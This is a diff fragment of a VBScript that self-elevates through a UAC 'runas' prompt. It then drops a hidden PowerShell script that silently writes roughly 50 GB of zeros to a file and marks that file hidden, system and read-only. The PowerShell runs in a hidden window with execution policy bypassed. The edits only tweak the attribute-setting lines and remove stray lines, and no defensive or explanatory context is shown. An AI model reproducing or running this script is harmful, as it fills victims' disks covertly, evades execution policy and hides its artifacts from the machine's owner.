@@ -1,7 +1,7 @@
 Set objShell = CreateObject("Shell.Application")
 If Not WScript.Arguments.Named.Exists("elevate") Then
-    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
-    WScript.Quit
+    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
+    WScript.Quit
 End If
 
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -29,18 +29,11 @@ psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
 psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
 psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 0 }"
 psFile.WriteLine "$Stream.Close()"
-psFile.WriteLine "attrib +h +s +r `"$BigFile`""
-psFile.WriteLine "attrib +h +s `"$PSCommandPath`""
+psFile.WriteLine "attrib +h +s +r $BigFile"
 psFile.Close
 
 fso.GetFile(psPath).Attributes = 2 + 4
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
 
-attrib +h +s +r "$BigFile"
-
 Set fso = Nothing
 Set WshShell = Nothing
-
-
-
-
